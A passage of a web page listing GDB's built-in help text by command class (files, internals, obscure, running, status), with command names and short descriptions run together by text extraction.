Set whether to send break if interruptedset remotecache -- Set cache use for remote targetsset remoteflow -- Set use of hardware flow control for remote serial I/Oset remotelogbase -- Set numerical base for remote session loggingset remotelogfile -- Set filename for remote session recordingset remotetimeout -- Set timeout limit to wait for target to respondset remotewritesize -- Set the maximum number of bytes per memory write packet (deprecated)set schedule-multiple -- Set mode for resuming threads of all processesset scheduler-locking -- Set mode for locking scheduler during executionset script-extension -- Set mode for script filename extension recognitionset serial -- Set default serial/parallel port configurationset serial baud -- Set baud rate for remote serial I/Oset serial parity -- Set parity for remote serial I/Oset solib-absolute-prefix -- Set an alternate system rootset solib-search-path -- Set the search path for loading non-absolute shared library symbol filesset stack-cache -- Set cache use for stack accessset startup-with-shell -- Set use of shell to start subprocessesset step-mode -- Set mode of the step operationset stop-on-solib-events -- Set stopping for shared library eventsset struct-convention -- Set the convention for returning small structsset substitute-path -- Usage: set substitute-path FROM TOset sysroot -- Set an alternate system rootset target-async -- Set whether MI asynchronous mode is enabledset target-charset -- Set the target character setset target-file-system-kind -- Set assumed file system kind for target reported file namesset target-wide-charset -- Set the target wide character setset tcp -- TCP protocol specific variablesset tcp auto-retry -- Set auto-retry on socket connectset tcp connect-timeout -- Set timeout limit in seconds for socket connectionset tdesc -- Set target description specific variablesset tdesc filename -- Set the file to read for an XML target descriptionset trace-buffer-size -- Set requested size of trace bufferset trace-commands -- Set tracing of GDB CLI commandsset trace-notes -- Set notes string to use for current and future trace runsset trace-stop-notes -- Set notes string to use for future tstop commandsset trace-user -- Set the user name to use for current and future trace runsset trust-readonly-sections -- Set mode for reading from readonly sectionsset tui -- TUI configuration variablesset tui active-border-mode -- Set the attribute mode to use for the active TUI window borderset tui border-kind -- Set the kind of border for TUI windowsset tui border-mode -- Set the attribute mode to use for the TUI window bordersset unwind-on-terminating-exception -- Set unwinding of stack if std::terminate is called while in call dummyset unwindonsignal -- Set unwinding of stack if a signal is received while in a call dummyset use-coredump-filter -- Set whether gcore should consider /proc/PID/coredump_filterset use-deprecated-index-sections -- Set whether to use deprecated gdb_index sectionsset variable -- Evaluate expression EXP and assign result to variable VARset verbose -- Set verbosityset watchdog -- Set watchdog timerset width -- Set number of characters where GDB should wrap lines of its outputset write -- Set writing into executable and core filesundisplay -- Cancel some expressions to be displayed when program stopswhatis -- Print data type of expression EXPx -- Examine memory: x/FMT ADDRESS</code></pre><h1 id="Command-class-files"><a href="#Command-class-files" class="headerlink" title="Command class: files"></a>Command class: files</h1><pre><code>add-symbol-file -- Load symbols from FILEadd-symbol-file-from-memory -- Load the symbols out of memory from a dynamically loaded object filecd -- Set working directory to DIR for debugger and program being debuggedcore-file -- Use FILE as core dump for examining memory and registersdirectory -- Add directory DIR to beginning of search path for source filesedit -- Edit specified file or functionexec-file -- Use FILE as program for getting contents of pure memoryfile -- Use FILE as program to be debuggedforward-search -- Search for regular expression (see regex(3)) from last line listedgenerate-core-file -- Save a core file with the current state of the debugged processlist -- List specified function or lineload -- Dynamically load FILE into the running programnosharedlibrary -- Unload all shared object library symbolspath -- Add directory DIR(s) to beginning of search path for object filespwd -- Print working directoryremote -- Manipulate files on the remote systemremote delete -- Delete a remote fileremote get -- Copy a remote file to the local systemremote put -- Copy a local file to the remote systemremove-symbol-file -- Remove a symbol file added via the add-symbol-file commandreverse-search -- Search backward for regular expression (see regex(3)) from last line listedsearch -- Search for regular expression (see regex(3)) from last line listedsection -- Change the base address of section SECTION of the exec file to ADDRsharedlibrary -- Load shared object library symbols for files matching REGEXPsymbol-file -- Load symbol table from executable file FILE</code></pre><h1 id="Command-class-internals"><a href="#Command-class-internals" class="headerlink" title="Command class: internals"></a>Command class: internals</h1><pre><code>flushregs -- Force gdb to flush its register cache (maintainer command)maintenance -- Commands for use by GDB maintainersmaintenance agent -- Translate an expression into remote agent bytecode for tracingmaintenance agent-eval -- Translate an expression into remote agent bytecode for evaluationmaintenance agent-printf -- Translate an expression into remote agent bytecode for evaluation and display the bytecodesmaintenance btrace -- Branch tracing maintenance commandsmaintenance btrace clear -- Clears the branch tracing datamaintenance btrace clear-packet-history -- Clears the branch tracing packet historymaintenance btrace packet-history -- Print the raw branch tracing datamaintenance check-psymtabs -- Check consistency of currently expanded psymtabs versus symtabsmaintenance check-symtabs -- Check consistency of currently expanded symtabsmaintenance cplus -- C++ maintenance commandsmaintenance cplus first_component -- Print the first class/namespace component of NAMEmaintenance cplus namespace -- Deprecated placeholder for removed functionalitymaintenance demangle -- This command has been moved to &quot;demangle&quot;maintenance demangler-warning -- Give GDB a demangler warningmaintenance deprecate -- Deprecate a commandmaintenance dump-me -- Get fatal error; make debugger dump its coremaintenance expand-symtabs -- Expand symbol tablesmaintenance flush-symbol-cache -- Flush the symbol cache for each program spacemaintenance info -- Commands for showing internal info about the program being debuggedmaintenance info bfds -- List the BFDs that are currently openmaintenance info breakpoints -- Status of all breakpointsmaintenance info btrace -- Info about branch tracing datamaintenance info program-spaces -- Info about currently known program spacesmaintenance info psymtabs -- List the partial symbol tables for all object filesmaintenance info sections -- List the BFD sections of the exec and core filesmaintenance info symtabs -- List the full symbol tables for all object filesmaintenance internal-error -- Give GDB an internal errormaintenance internal-warning -- Give GDB an internal warningmaintenance packet -- Send an arbitrary packet to a remote targetmaintenance print -- Maintenance command for printing GDB internal statemaintenance print architecture -- Print the internal architecture configurationmaintenance print c-tdesc -- Print the current target description as a C source filemaintenance print cooked-registers -- Print the internal register configuration including cooked valuesmaintenance print dummy-frames -- Print the contents of the internal dummy-frame stackmaintenance print msymbols -- Print dump of current minimal symbol definitionsmaintenance print objfiles -- Print dump of current object file definitionsmaintenance print psymbols -- Print dump of current partial symbol definitionsmaintenance print raw-registers -- Print the internal register configuration including raw valuesmaintenance print reggroups -- Print the internal register group namesmaintenance print register-groups -- Print the internal register configuration including each register&apos;s groupmaintenance print registers -- Print the internal register configurationmaintenance print remote-registers -- Print the internal register configuration including each register&apos;smaintenance print statistics -- Print statistics about internal gdb statemaintenance print symbol-cache -- Dump the symbol cache for each program spacemaintenance print symbol-cache-statistics -- Print symbol cache statistics for each program spacemaintenance print symbols -- Print dump of current symbol definitionsmaintenance print target-stack -- Print the name of each layer of the internal target stackmaintenance print type -- Print a type chain for a given symbolmaintenance print user-registers -- List the names of the current user registersmaintenance set -- Set GDB internal variables used by the GDB maintainermaintenance set ada -- Set Ada maintenance-related variablesmaintenance set ada ignore-descriptive-types -- Set whether descriptive types generated by GNAT should be ignoredmaintenance set bfd-sharing -- Set whether gdb will share bfds that appear to be the same filemaintenance set btrace -- Set branch tracing specific variablesmaintenance set btrace pt -- Set Intel Processor Trace specific variablesmaintenance set btrace pt skip-pad -- Set whether PAD packets should be skipped in the btrace packet historymaintenance set catch-demangler-crashes -- Set whether to attempt to catch demangler crashesmaintenance set demangler-warning -- Configure what GDB does when demangler-warning is detectedmaintenance set demangler-warning quit -- Set whether GDB should quit when an demangler-warning is detectedmaintenance set dwarf -- Set DWARF specific variablesmaintenance set dwarf always-disassemble -- Set whether `info address&apos; always disassembles DWARF expressionsmaintenance set dwarf max-cache-age -- Set the upper bound on the age of cached DWARF compilation unitsmaintenance set internal-error -- Configure what GDB does when internal-error is detectedmaintenance set internal-error corefile -- Set whether GDB should create a core file of GDB when internal-error is detectedmaintenance set internal-error quit -- Set whether GDB should quit when an internal-error is detectedmaintenance set internal-warning -- Configure what GDB does when internal-warning is detectedmaintenance set internal-warning corefile -- Set whether GDB should create a core file of GDB when internal-warning is detectedmaintenance set internal-warning quit -- Set whether GDB should quit when an internal-warning is detectedmaintenance set per-command -- Per-command statistics settingsset per-command space -- Set whether to display per-command space usageset per-command symtab -- Set whether to display per-command symtab statisticsset per-command time -- Set whether to display per-command execution timemaintenance set profile -- Set internal profilingmaintenance set show-debug-regs -- Set whether to show variables that mirror the x86 debug registersmaintenance set symbol-cache-size -- Set the size of the symbol cachemaintenance set target-async -- Set whether gdb controls the inferior in asynchronous modemaintenance set target-non-stop -- Set whether gdb always controls the inferior in non-stop modemaintenance show -- Show GDB internal variables used by the GDB maintainermaintenance show ada -- Show Ada maintenance-related variablesmaintenance show ada ignore-descriptive-types -- Show whether descriptive types generated by GNAT should be ignoredmaintenance show bfd-sharing -- Show whether gdb will share bfds that appear to be the same filemaintenance show btrace -- Show branch tracing specific variablesmaintenance show btrace pt -- Show Intel Processor Trace specific variablesmaintenance show btrace pt skip-pad -- Show whether PAD packets should be skipped in the btrace packet historymaintenance show catch-demangler-crashes -- Show whether to attempt to catch demangler crashesmaintenance show demangler-warning -- Show what GDB does when demangler-warning is detectedmaintenance show demangler-warning quit -- Show whether GDB will quit when an demangler-warning is detectedmaintenance show dwarf -- Show DWARF specific variablesmaintenance show dwarf always-disassemble -- Show whether `info address&apos; always disassembles DWARF expressionsmaintenance show dwarf max-cache-age -- Show the upper bound on the age of cached DWARF compilation unitsmaintenance show internal-error -- Show what GDB does when internal-error is detectedmaintenance show internal-error corefile -- Show whether GDB will create a core file of GDB when internal-error is detectedmaintenance show internal-error quit -- Show whether GDB will quit when an internal-error is detectedmaintenance show internal-warning -- Show what GDB does when internal-warning is detectedmaintenance show internal-warning corefile -- Show whether GDB will create a core file of GDB when internal-warning is detectedmaintenance show internal-warning quit -- Show whether GDB will quit when an internal-warning is detectedmaintenance show per-command -- Show per-command statistics settingsshow per-command space -- Show whether to display per-command space usageshow per-command symtab -- Show whether to display per-command symtab statisticsshow per-command time -- Show whether to display per-command execution timemaintenance show profile -- Show internal profilingmaintenance show show-debug-regs -- Show whether to show variables that mirror the x86 debug registersmaintenance show symbol-cache-size -- Show the size of the symbol cachemaintenance show target-async -- Show whether gdb controls the inferior in asynchronous modemaintenance show target-non-stop -- Show whether gdb always controls the inferior in non-stop modemaintenance space -- Set the display of space usagemaintenance time -- Set the display of time usagemaintenance translate-address -- Translate a section name and address to a symbolmaintenance undeprecate -- Undeprecate a command</code></pre><h1 id="Command-class-obscure"><a href="#Command-class-obscure" class="headerlink" title="Command class: obscure"></a>Command class: obscure</h1><pre><code>checkpoint -- Fork a duplicate process (experimental)compare-sections -- Compare section data on target to the exec filecompile -- Command to compile source code and inject it into the inferiorcompile code -- Compilecompile file -- Evaluate a file containing source codecompile print -- Evaluate EXPR by using the compiler and print resultcomplete -- List the completions for the rest of the line as a commandexpression -- Command to compile source code and inject it into the inferiorcompile code -- Compilecompile file -- Evaluate a file containing source codecompile print -- Evaluate EXPR by using the compiler and print resultfastbins -- Walk and print the fast binsfreebins -- Walk and print the nonempty free binsguile -- Evaluate a Guile expressionguile-repl -- Start a Guile interactive promptheap -- Libheap command help listingheapls -- Print a flat listing of an arenaheaplsc -- Print compact arena layout (all chunks)monitor -- Send a command to the remote monitor (remote targets only)mstats -- Print general malloc statsprint_bin_layout -- Dump the layout of a free binpython -- Evaluate a Python commandpython-interactive -- Start an interactive Python promptrecord -- Start recordingrecord btrace -- Start branch trace recordingrecord btrace bts -- Start branch trace recording in Branch Trace Store (BTS) formatrecord btrace pt -- Start branch trace recording in Intel Processor Trace formatrecord delete -- Delete the rest of execution log and start recording it anewrecord full -- Start full execution recordingrecord full restore -- Restore the execution log from a filerecord function-call-history -- Prints the execution history at function granularityrecord goto -- Restore the program to its state at instruction number Nrecord goto begin -- Go to the beginning of the execution logrecord goto end -- Go to the end of the execution logrecord instruction-history -- Print disassembled instructions stored in the execution logrecord save -- Save the execution log to a filerecord stop -- Stop the record/replay targetrestart -- Restart &lt;n&gt;: restore program context from a checkpointsmallbins -- Walk and print the small binsstop -- There is no `stop&apos; command</code></pre><h1 id="Command-class-running"><a href="#Command-class-running" class="headerlink" title="Command class: running"></a>Command class: running</h1><pre><code>advance -- Continue the program up to the given location (same form as args for break command)attach -- Attach to a process or file outside of GDBcontinue -- Continue program being debuggeddetach -- Detach a process or file previously attacheddetach checkpoint -- Detach from a checkpoint (experimental)detach inferiors -- Detach from inferior ID (or list of IDS)disconnect -- Disconnect from a targetfinish -- Execute until selected stack frame returnshandle -- Specify how to handle signalsinferior -- Use this command to switch between inferiorsinterrupt -- Interrupt the execution of the debugged programjump -- Continue program being debugged at specified line or addresskill -- Kill execution of program being debuggedkill inferiors -- Kill inferior ID (or list of IDs)next -- Step programnexti -- Step one instructionqueue-signal -- Queue a signal to be delivered to the current thread when it is resumedreverse-continue -- Continue program being debugged but run it in reversereverse-finish -- Execute backward until just before selected stack frame is calledreverse-next -- Step program backwardreverse-nexti -- Step backward one instructionreverse-step -- Step program backward until it reaches the beginning of another source linereverse-stepi -- Step backward exactly one instructionrun -- Start debugged programsignal -- Continue program with the specified signalstep -- Step program until it reaches a different source linestepi -- Step one instruction exactlytarget -- Connect to a target machine or processtarget core -- Use a core file as a targettarget ctf -- Use a CTF directory as a targettarget exec -- Use an executable file as a targettarget extended-remote -- Use a remote computer via a serial linetarget native -- Native process (started by the &quot;run&quot; command)target record -- Log program while executing and replay execution from logtarget record-btrace -- Collect control-flow trace and provide the execution historytarget record-core -- Log program while executing and replay execution from logtarget record-full -- Log program while executing and replay execution from logtarget remote -- Use a remote computer via a serial linetarget tfile -- Use a trace file as a targettask -- Use this command to switch between Ada tasksthread -- Use this command to switch between threadsthread apply -- Apply a command to a list of threadsthread apply all -- Apply a command to all threadsthread find -- Find threads that match a regular expressionthread name -- Set the current thread&apos;s nameuntil -- Execute until the program reaches a source line greater than the current</code></pre><h1 id="Command-class-status"><a href="#Command-class-status" class="headerlink" title="Command class: status"></a>Command class: status</h1><pre><code>info -- Generic command for showing things about the program being debuggedinfo address -- Describe where symbol SYM is storedinfo all-registers -- List of all registers and their contentsinfo args -- Argument variables of current stack frameinfo auto-load -- Print current status of auto-loaded filesinfo auto-load gdb-scripts -- Print the list of automatically loaded sequences of commandsinfo auto-load libthread-db -- Print the list of loaded inferior specific libthread_dbinfo auto-load local-gdbinit -- Print whether current directory .gdbinit file has been loadedinfo auto-load python-scripts -- Print the list of automatically loaded Python scriptsinfo auto-load-scripts -- Print the list of automatically loaded Python scriptsinfo auxv -- Display the inferior&apos;s auxiliary vectorinfo bookmarks -- Status of user-settable bookmarksinfo breakpoints -- Status of specified breakpoints (all user-settable breakpoints if no argument)info checkpoints -- IDs of currently known checkpointsinfo classes -- All Objective-C classesinfo common -- Print out the values contained in a Fortran COMMON blockinfo copying -- Conditions for redistributing copies of GDBinfo dcache -- Print information on the dcache performanceinfo display -- Expressions to display when program stopsinfo exceptions -- List all Ada exception namesinfo extensions -- All filename extensions associated with a source languageinfo files -- Names of targets and files being debuggedinfo float -- Print the status of the floating point unitinfo frame -- All about selected stack frameinfo frame-filter -- List all registered Python frame-filtersinfo functions -- All function namesinfo guile -- Prefix command for Guile info displaysinfo handle -- What debugger does when program gets various signalsinfo inferiors -- IDs of specified inferiors (all inferiors if no argument)info line -- Core addresses of the code for a source lineinfo locals -- Local variables of current stack frameinfo macro -- Show the definition of MACROinfo macros -- Show the definitions of all macros at LINESPECinfo mem -- Memory region attributesinfo os -- Show OS data ARGinfo pretty-printer -- GDB command to list all registered pretty-printersinfo probes -- Show available static probesinfo probes all -- Show information about all type of probesinfo probes dtrace -- Show information about DTrace static probesinfo probes stap -- Show information about SystemTap static probesinfo proc -- Show /proc process information about any running processinfo proc all -- List all available /proc infoinfo proc cmdline -- List command line arguments of the processinfo proc cwd -- List current working directory of the processinfo proc exe -- List absolute filename for executable of the processinfo proc mappings -- List of mapped memory regionsinfo proc stat -- List process info from /proc/PID/statinfo proc status -- List process info from /proc/PID/statusinfo program -- Execution status of the programinfo record -- Info record optionsinfo registers -- List of integer registers and their contentsinfo scope -- List the variables local to a scopeinfo selectors -- All Objective-C selectorsinfo set -- Show all GDB settingsinfo sharedlibrary -- Status of loaded shared object librariesinfo signals -- What debugger does when program gets various signalsinfo skip -- Display the status of skipsinfo source -- Information about the current source fileinfo sources -- Source files in the programinfo stack -- Backtrace of the stackinfo static-tracepoint-markers -- List target static tracepoints markersinfo symbol -- Describe what symbol is at location ADDRinfo target -- Names of targets and files being debuggedinfo tasks -- Provide information about all known Ada tasksinfo terminal -- Print inferior&apos;s saved terminal statusinfo threads -- Display currently known threadsinfo tracepoints -- Status of specified tracepoints (all tracepoints if no argument)info tvariables -- Status of trace state variables and their valuesinfo type-printers -- GDB command to list all registered type-printersinfo types -- All type namesinfo unwinder -- GDB command to list unwindersinfo variables -- All global and static variable namesinfo vector -- Print the status of the vector unitinfo vtbl -- Show the virtual function table for a C++ objectinfo warranty -- Various kinds of warranty you do not haveinfo watchpoints -- Status of specified watchpoints (all watchpoints if no argument)info win -- List of all displayed windowsinfo xmethod -- GDB command to list registered xmethod matchersmacro -- Prefix for commands dealing with C preprocessor macrosmacro define -- Define a new C/C++ preprocessor macromacro expand -- Fully expand any C/C++ preprocessor macro invocations in EXPRESSIONmacro expand-once -- Expand C/C++ preprocessor macro invocations appearing directly in EXPRESSIONmacro list -- List all the macros defined using the `macro define&apos; commandmacro undef -- Remove the definition of the C/C++ preprocessor macro with the given nameshow -- Generic command for showing things about the debuggershow ada -- Generic command for showing Ada-specific settingsshow ada print-signatures -- Show whether the output of formal and return types for functions in the overloads selection menu is activatedshow ada trust-PAD-over-XVS -- Show whether an optimization trusting PAD types over XVS types is activatedshow agent -- Show debugger&apos;s willingness to use agent as a helpershow annotate -- Show annotation_levelshow architecture -- Show architecture of targetshow args -- Show argument list to give program being debugged when it is startedshow auto-connect-native-target -- Show whether GDB may automatically connect to the native targetshow auto-load -- Show auto-loading specific settingsshow auto-load gdb-scripts -- Show whether auto-loading of canned sequences of commands scripts is enabledshow auto-load libthread-db -- Show whether auto-loading inferior specific libthread_db is enabledshow auto-load local-gdbinit -- Show whether auto-loading .gdbinit script in current directory is enabledshow auto-load python-scripts -- Show the debugger&apos;s behaviour regarding auto-loaded Python scriptsshow auto-load safe-path -- Show the list of files and directories that are safe for auto-loadingshow auto-load scripts-directory -- Show the list of directories from which to load auto-loaded scriptsshow auto-load-scripts -- Show the debugger&apos;s behaviour regarding auto-loaded Python scriptsshow auto-solib-add -- Show autoloading of shared library symbolsshow backtrace -- Show backtrace specific variablesshow backtrace limit -- Show the upper bound on the number of backtrace levelsshow backtrace past-entry -- Show whether backtraces should continue past the entry point of a programshow backtrace past-main -- Show whether backtraces should continue past &quot;main&quot;show basenames-may-differ -- Show whether a source file may have multiple base namesshow breakpoint -- Breakpoint specific settingsshow breakpoint always-inserted -- Show mode for inserting breakpointsshow breakpoint auto-hw -- Show automatic usage of hardware breakpointsshow breakpoint condition-evaluation -- Show mode of breakpoint condition evaluationshow breakpoint pending -- Show debugger&apos;s behavior regarding pending breakpointsshow can-use-hw-watchpoints -- Show debugger&apos;s willingness to use watchpoint hardwareshow case-sensitive -- Show case sensitivity in name searchshow charset -- Show the host and target character setsshow check -- Show the status of the type/range checkershow check range -- Show range checkingshow check type -- Show strict type checkingshow circular-trace-buffer -- Show target&apos;s use of circular trace buffershow code-cache -- Show cache use for code segment accessshow coerce-float-to-double -- Show coercion of floats to doubles when calling functionsshow commands -- Show the history of commands you typedshow compile-args -- Show compile command GCC command-line argumentsshow complaints -- Show max number of complaints about incorrect symbolsshow configuration -- Show how GDB was configured at build timeshow confirm -- Show whether to confirm potentially dangerous operationsshow convenience -- Debugger convenience (&quot;foo&quot;) variables and functionsshow copying -- Conditions for redistributing copies of GDBshow cp-abi -- Show the ABI used for inspecting C++ objectsshow data-directory -- Show GDB&apos;s data directoryshow dcache -- Show dcachesettingsshow dcache line-size -- Show dcache line sizeshow dcache size -- Show number of dcache linesshow debug -- Generic command for showing gdb debugging flagsshow debug arch -- Show architecture debuggingshow debug auto-load -- Show auto-load verifications debuggingshow debug bfd-cache -- Show bfd cache debuggingshow debug check-physname -- Show cross-checking of &quot;physname&quot; code against demanglershow debug coff-pe-read -- Show coff PE read debuggingshow debug compile -- Show compile command debuggingshow debug displaced -- Show displaced stepping debuggingshow debug dwarf-die -- Show debugging of the DWARF DIE readershow debug dwarf-line -- Show debugging of the dwarf line readershow debug dwarf-read -- Show debugging of the DWARF readershow debug entry-values -- Show entry values and tail call frames debuggingshow debug expression -- Show expression debuggingshow debug frame -- Show frame debuggingshow debug infrun -- Show inferior debuggingshow debug jit -- Show JIT debuggingshow debug libthread-db -- Show libthread-db debuggingshow debug lin-lwp -- Show debugging of GNU/Linux lwp moduleshow debug linux-namespaces -- Show debugging of GNU/Linux namespaces moduleshow debug notification -- Show debugging of async remote notificationshow debug observer -- Show observer debuggingshow debug overload -- Show debugging of C++ overloadingshow debug parser -- Show parser debuggingshow debug py-unwind -- Show Python unwinder debuggingshow debug record -- Show debugging of record/replay featureshow debug remote -- Show debugging of remote protocolshow debug serial -- Show serial debuggingshow debug stap-expression -- Show SystemTap expression debuggingshow debug symbol-lookup -- Show debugging of symbol lookupshow debug symfile -- Show debugging of the symfile functionsshow debug symtab-create -- Show debugging of symbol table creationshow debug target -- Show target debuggingshow debug timestamp -- Show timestamping of debugging messagesshow debug varobj -- Show varobj debuggingshow debug xml -- Show XML parser debuggingshow debug-file-directory -- Show the directories where separate debug symbols are searched forshow default-collect -- Show the list of expressions to collect by defaultshow demangle-style -- Show the current C++ demangling styleshow detach-on-fork -- Show whether gdb will detach the child of a forkshow directories -- Show the search path for finding source filesshow disable-randomization -- Show disabling of debuggee&apos;s virtual address space randomizationshow disassemble-next-line -- Show whether to disassemble next source line or insn when execution stopsshow disassembly-flavor -- Show the disassembly flavorshow disconnected-dprintf -- Show whether dprintf continues after GDB disconnectsshow disconnected-tracing -- Show whether tracing continues after GDB disconnectsshow displaced-stepping -- Show debugger&apos;s willingness to use displaced steppingshow dprintf-channel -- Show the channel to use for dynamic printfshow dprintf-function -- Show the function to use for dynamic printfshow dprintf-style -- Show the style of usage for dynamic printfshow editing -- Show editing of command lines as they are typedshow endian -- Show endianness of targetshow environment -- The environment to give the programshow exec-direction -- Show direction of execution (forward/reverse)show exec-done-display -- Show notification of completion for asynchronous execution commandsshow exec-wrapper -- Show the wrapper for running programsshow extended-prompt -- Show the extended promptshow extension-language -- Show mapping between filename extension and source languageshow filename-display -- Show how to display filenamesshow follow-exec-mode -- Show debugger response to a program call of execshow follow-fork-mode -- Show debugger response to a program call of fork or vforkshow frame-filter -- Prefix command for &apos;show&apos; frame-filter related operationsshow frame-filter priority -- GDB command to show the priority of the specified frame-filtershow gnutarget -- Show the current BFD targetshow guile -- Prefix command for Guile preference settingsshow guile print-stack -- Show the mode of Guile exception printing on errorshow height -- Show number of lines in a page for GDB output paginationshow history -- Generic command for showing command history parametersshow history expansion -- Show history expansion on command inputshow history filename -- Show the filename in which to record the command historyshow history remove-duplicates -- Show how far back in history to look for and remove duplicate entriesshow history save -- Show saving of the history record on exitshow history size -- Show the size of the command historyshow host-charset -- Show the host character setshow inferior-tty -- Show terminal for future runs of program being debuggedshow input-radix -- Show default input radix for entering numbersshow interactive-mode -- Show whether GDB&apos;s standard input is a terminalshow language -- Show the current source languageshow libthread-db-search-path -- Show the current search path or libthread_dbshow listsize -- Show number of source lines gdb will list by defaultshow logging -- Show logging optionsshow logging file -- Show the current logfileshow logging overwrite -- Show whether logging overwrites or appends to the log fileshow logging redirect -- Show the logging output modeshow max-completions -- Show maximum number of completion candidatesshow max-user-call-depth -- Show the max call depth for non-python/scheme user-defined commandsshow max-value-size -- Show maximum sized value gdb will load from the inferiorshow may-insert-breakpoints -- Show permission to insert breakpoints in the targetshow may-insert-fast-tracepoints -- Show permission to insert fast tracepoints in the targetshow may-insert-tracepoints -- Show permission to insert tracepoints in the targetshow may-interrupt -- Show permission to interrupt or signal the targetshow may-write-memory -- Show permission to write into target memoryshow may-write-registers -- Show permission to write into registersshow mem -- Memory regions settingsshow mem  inaccessible-by-default -- Show handling of unknown memory regionsshow mi-async -- Show whether MI asynchronous mode is enabledshow mpx -- Show Intel Memory Protection Extensions specific variablesshow mpx bound -- Show the memory bounds for a given array/pointer storage in the bound tableshow multiple-symbols -- Show how the debugger handles ambiguities in expressionsshow non-stop -- Show whether gdb controls the inferior in non-stop modeshow observer -- Show whether gdb controls the inferior in observer modeshow opaque-type-resolution -- Show resolution of opaque struct/class/union types (if set before loading symbols)show osabi -- Show OS ABI of targetshow output-radix -- Show default output radix for printing of valuesshow overload-resolution -- Show overload resolution in evaluating C++ functionsshow pagination -- Show state of GDB output paginationshow paths -- Current search path for finding object filesshow print -- Generic command for showing print settingsshow print address -- Show printing of addressesshow print array -- Show pretty formatting of arraysshow print array-indexes -- Show printing of array indexesshow print asm-demangle -- Show demangling of C++/ObjC names in disassembly listingsshow print demangle -- Show demangling of encoded C++/ObjC names when displaying symbolsshow print elements -- Show limit on string chars or array elements to printshow print entry-values -- Show printing of function arguments at function entryshow print frame-arguments -- Show printing of non-scalar frame argumentsshow print inferior-events -- Show printing of inferior events (e.g.show print max-symbolic-offset -- Show the largest offset that will be printed in &lt;symbol+1234&gt; formshow print null-stop -- Show printing of char arrays to stop at first null charshow print object -- Show printing of object&apos;s derived type based on vtable infoshow print pascal_static-members -- Show printing of pascal static membersshow print pretty -- Show pretty formatting of structuresshow print raw -- Generic command for showing &quot;print raw&quot; settingsshow print raw frame-arguments -- Show whether to print frame arguments in raw formshow print repeats -- Show threshold for repeated print elementsshow print sevenbit-strings -- Show printing of 8-bit characters in strings as \nnnshow print static-members -- Show printing of C++ static membersshow print symbol -- Show printing of symbol names when printing pointersshow print symbol-filename -- Show printing of source filename and line number with &lt;symbol&gt;show print symbol-loading -- Show printing of symbol loading messagesshow print thread-events -- Show printing of thread events (such as thread start and exit)show print type -- Generic command for showing type-printing settingsshow print type methods -- Show printing of methods defined in classesshow print type typedefs -- Show printing of typedefs defined in classesshow print union -- Show printing of unions interior to structuresshow print vtbl -- Show printing of C++ virtual function tablesshow prompt -- Show gdb&apos;s promptshow python -- Prefix command for python preference settingsshow python print-stack -- Show the mode of Python stack printing on errorshow radix -- Show the default input and output number radicesshow range-stepping -- Show whether target-assisted range stepping is enabledshow record -- Show record optionsshow record btrace -- Show record optionsshow record btrace bts -- Show record btrace bts optionsshow record btrace bts buffer-size -- Show the record/replay bts buffer sizeshow record btrace pt -- Show record btrace pt optionsshow record btrace pt buffer-size -- Show the record/replay pt buffer sizeshow record btrace replay-memory-access -- Show what memory accesses are allowed during replayshow record full -- Show record optionsshow record full insn-number-max -- Show record/replay buffer limitshow record full memory-query -- Show whether query if PREC cannot record memory change of next instructionshow record full stop-at-limit -- Show whether record/replay stops when record/replay buffer becomes fullshow record function-call-history-size -- Show number of functions to print in &quot;record function-call-history&quot;show record instruction-history-size -- Show number of instructions to print in &quot;record instruction-history&quot;show remote -- Remote protocol specific variablesshow remote P-packet -- Show current use of remote protocol `P&apos; (set-register) packetshow remote TracepointSource-packet -- Show current use of remote protocol `TracepointSource&apos; (TracepointSource) packetshow remote X-packet -- Show current use of remote protocol `X&apos; (binary-download) packetshow remote Z-packet -- Show use of remote protocol `Z&apos; packets show remote access-watchpoint-packet -- Show current use of remote protocol `Z4&apos; (access-watchpoint) packetshow remote agent-packet -- Show current use of remote protocol `QAgent&apos; (agent) packetshow remote allow-packet -- Show current use of remote protocol `QAllow&apos; (allow) packetshow remote attach-packet -- Show current use of remote protocol `vAttach&apos; (attach) packetshow remote binary-download-packet -- Show current use of remote protocol `X&apos; (binary-download) packetshow remote breakpoint-commands-packet -- Show current use of remote protocol `BreakpointCommands&apos; (breakpoint-commands) packetshow remote btrace-conf-bts-size-packet -- Show current use of remote protocol `Qbtrace-conf:bts:size&apos; (btrace-conf-bts-size) packetshow remote btrace-conf-pt-size-packet -- Show current use of remote protocol `Qbtrace-conf:pt:size&apos; (btrace-conf-pt-size) packetshow remote catch-syscalls-packet -- Show current use of remote protocol `QCatchSyscalls&apos; (catch-syscalls) packetshow remote conditional-breakpoints-packet -- Show current use of remote protocol `ConditionalBreakpoints&apos; (conditional-breakpoints) packetshow remote conditional-tracepoints-packet -- Show current use of remote protocol `ConditionalTracepoints&apos; (conditional-tracepoints) packetshow remote ctrl-c-packet -- Show current use of remote protocol `vCtrlC&apos; (ctrl-c) packetshow remote disable-btrace-packet -- Show current use of remote protocol `Qbtrace:off&apos; (disable-btrace) packetshow remote disable-randomization-packet -- Show current use of remote protocol `QDisableRandomization&apos; (disable-randomization) packetshow remote enable-btrace-bts-packet -- Show current use of remote protocol `Qbtrace:bts&apos; (enable-btrace-bts) packetshow remote enable-btrace-pt-packet -- Show current use of remote protocol `Qbtrace:pt&apos; (enable-btrace-pt) packetshow remote exec-event-feature-packet -- Show current use of remote protocol `exec-event-feature&apos; (exec-event-feature) packetshow remote exec-file -- Show the remote pathname for &quot;run&quot;show remote fast-tracepoints-packet -- Show current use of remote protocol `FastTracepoints&apos; (fast-tracepoints) packetshow remote fetch-register-packet -- Show current use of remote protocol `p&apos; (fetch-register) packetshow remote fork-event-feature-packet -- Show current use of remote protocol `fork-event-feature&apos; (fork-event-feature) packetshow remote get-thread-information-block-address-packet -- Show current use of remote protocol `qGetTIBAddr&apos; (get-thread-information-block-address) packetshow remote get-thread-local-storage-address-packet -- Show current use of remote protocol `qGetTLSAddr&apos; (get-thread-local-storage-address) packetshow remote hardware-breakpoint-limit -- Show the maximum number of target hardware breakpointsshow remote hardware-breakpoint-packet -- Show current use of remote protocol `Z1&apos; (hardware-breakpoint) packetshow remote hardware-watchpoint-length-limit -- Show the maximum length (in bytes) of a target hardware watchpointshow remote hardware-watchpoint-limit -- Show the maximum number of target hardware watchpointsshow remote hostio-close-packet -- Show current use of remote protocol `vFile:close&apos; (hostio-close) packetshow remote hostio-fstat-packet -- Show current use of remote protocol `vFile:fstat&apos; (hostio-fstat) packetshow remote hostio-open-packet -- Show current use of remote protocol `vFile:open&apos; (hostio-open) packetshow remote hostio-pread-packet -- Show current use of remote protocol `vFile:pread&apos; 